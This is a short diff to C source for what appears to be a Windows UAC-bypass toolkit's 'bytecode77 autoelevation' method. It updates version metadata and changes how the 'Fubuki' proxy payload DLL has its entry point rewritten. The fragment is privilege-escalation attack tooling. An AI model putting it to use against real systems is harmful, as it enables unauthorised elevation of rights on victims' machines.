@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.15
 *
-*  DATE:        23 Nov 2018
+*  DATE:        15 Feb 2019
 *
 *  bytecode77 autoelevation methods.
 *
@@ -52,10 +52,11 @@ BOOL ucmVolatileEnvMethod(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        if (!supConvertDllToExeSetNewEP(
+        if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT))
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
         {
             break;
         }
